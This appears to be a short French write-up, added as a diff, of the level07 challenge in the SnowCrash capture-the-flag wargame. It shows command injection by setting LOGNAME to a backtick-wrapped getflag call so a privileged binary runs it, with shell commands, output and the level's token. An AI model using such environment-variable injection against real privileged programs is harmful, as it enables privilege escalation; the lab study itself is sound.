@@ -1,0 +1,31 @@
+On a affaire a un exe qui renvois son nom
+
+j'ai tester de faire "file level07"
+
+mais rien de particuler
+
+cat n'a rien donner non plus
+
+j'ai chercher des dossiers dans la session mais RAS
+
+puis j'ai eu l'idée de regarder les variables d'environnements
+
+en modifiant 
+export LOGNAME=toto
+
+la fonction renvois "toto"
+
+j'ai donc essayé de faire passer getflag a level07
+export LOGNAME=`getflag`
+On a un début de réponse mais le message est coupé
+level07@SnowCrash:~$ export LOGNAME=`getflag`
+level07@SnowCrash:~$ ./level07 
+Check flag.Here is your token :
+sh: 2: Syntax error: ")" unexpected
+
+j'ai tester en rajoutant un echo 
+j'ai du mute les ` sur le echo car sinon j'avais le message classique du getflag
+level07@SnowCrash:~$ export LOGNAME=echo"\`getflag\`"
+level07@SnowCrash:~$ ./level07 
+echoCheck flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
